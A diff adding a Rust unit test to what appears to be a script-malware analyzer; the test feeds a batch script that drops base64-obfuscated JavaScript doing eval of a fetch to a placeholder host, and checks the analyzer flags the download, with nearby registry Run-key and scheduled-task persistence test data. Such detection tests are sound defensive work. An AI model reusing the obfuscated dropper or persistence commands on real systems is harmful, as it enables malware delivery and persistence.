@@ -1533,6 +1533,30 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Quoted" /t REG_
     }
 
     #[test]
+    fn call_current_dir_generated_js_queues_tracked_script_content() {
+        use base64::Engine;
+
+        let js_payload = "fetch('https://implicit-current-dir-js-b64.example/p')";
+        let encoded = base64::engine::general_purpose::STANDARD.encode(js_payload.as_bytes());
+        let script = format!(
+            "@echo off\r\n\
+             echo eval(atob(\"{encoded}\"));>x.js\r\n\
+             call .\\x.js\r\n"
+        );
+        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "https://implicit-current-dir-js-b64.example/p"
+            )),
+            "current-dir generated implicit JS content was not scanned: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn schtasks_create_emits_persistence_trait() {
         // `schtasks /create /tn X /tr Y` registers a scheduled-task
         // autorun. Same Persistence trait as reg-add Run, with
